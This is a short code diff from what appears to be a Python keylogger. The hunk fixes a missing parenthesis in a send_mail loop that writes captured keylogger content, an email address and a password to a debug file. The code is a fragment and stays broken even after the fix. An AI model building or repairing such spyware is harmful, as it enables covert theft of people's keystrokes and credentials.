@@ -38,7 +38,7 @@ def send_mail():
     while True:
 		file_object = open(debugFile, "rw")
 		file_object.write("===== SENDING EMAIL: DEBUG MODE =====")
-		file_object.write("Data Content Length: " + len(data)
+		file_object.write("Data Content Length: " + len(data))
 		file_object.write("Keylogger Content: " + data)
 		file_object.write("Email: " + EEMAIL)
 		file_object.write("Password: " + EPASS)
